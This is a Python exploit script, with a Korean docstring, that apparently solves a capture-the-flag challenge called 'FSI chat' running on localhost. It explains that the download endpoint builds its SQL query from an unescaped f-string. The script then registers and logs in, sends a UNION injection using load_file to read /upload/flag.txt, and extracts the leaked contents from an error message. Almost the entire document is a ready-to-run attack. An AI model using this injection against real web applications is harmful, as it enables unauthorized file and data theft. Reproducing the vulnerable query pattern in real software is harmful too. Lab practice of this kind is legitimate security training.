#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FSI 채팅 — SQLi 파일유출 (fsi-chat-sqli)  ·  대상 http://localhost:9090

취약점: ext/app.py 의 download() 는 다른 쿼리와 달리 safeQuery() 를 거치지 않고
        filepath 를 그대로 f-string 에 넣는다 →  raw SQL injection.
          query = f'select loginid from board where filepath="{filepath}" limit 0,1'
        그리고 결과(fileOwner)가 내 세션 userid 와 다르면 그 값을 에러 문자열로 반환한다:
          return f"file owner({fileOwner})!=loginid({userid})"
        → UNION 으로 fileOwner 자리에 load_file('/upload/flag.txt') 를 끼워 넣으면
          owner!=me 분기에서 '파일 내용'이 그대로 응답에 노출된다.
        (db 는 --secure-file-priv=/upload/ 라 /upload/flag.txt 는 load_file 가능)

실행:  python fsi_sqli.py        (먼저 FSI 가 :9090 으로 떠 있어야 함)
"""
import sys, re, time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:9090"

def main():
    s = requests.Session()
    uid = "sqli_%d" % (int(time.time()) % 100000)
    pw  = "pw_demo_123"
    # download() 는 로그인 필요(sessionCheck) → 아무 계정이나 가입 후 로그인
    s.post(BASE + "/register", data={"userid": uid, "userpw": pw}, timeout=10)
    s.post(BASE + "/login",    data={"userid": uid, "userpw": pw}, timeout=10)
    print("[*] logged in as %s" % uid)

    # filepath 에 UNION 주입 — safeQuery 미적용이라 " 가 이스케이프되지 않는다.
    #   select loginid from board where filepath="X" union select load_file("/upload/flag.txt") -- -" limit 0,1
    payload = 'X" union select load_file("/upload/flag.txt") -- -'
    r = s.get(BASE + "/download", params={"filepath": payload}, timeout=10)
    print("[*] response: %s" % r.text.strip()[:200])

    m = re.search(r"fsi2022\{[^}]*\}", r.text)
    if m:
        print("[+] FLAG (fsi-chat-sqli):", m.group(0))
        return 0
    print("[-] flag not found — FSI(:9090)/db 기동 상태를 확인하세요.")
    return 1

if __name__ == "__main__":
    raise SystemExit(main())
